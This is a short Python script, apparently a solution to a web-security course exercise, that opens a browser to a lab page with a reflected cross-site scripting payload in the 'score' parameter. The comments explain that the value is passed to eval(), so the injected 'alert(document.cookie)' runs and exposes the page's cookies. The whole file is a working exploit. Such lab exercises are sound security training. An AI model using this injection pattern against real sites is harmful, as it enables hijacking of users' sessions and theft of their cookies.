import webbrowser

# Exploit: include script in the 'score' - the value of 'score' is placed
# inside a eval() statement so the script will be executed
# score = 1;alert(document.cookie)
# Reflected XSS (with XSS-auditor)

def main():
    webbrowser.open('http://www.wsb.com/Assignment2/case05.php?score=1%3Balert%28document.cookie%29', 2)

if __name__ == "__main__":
    main()
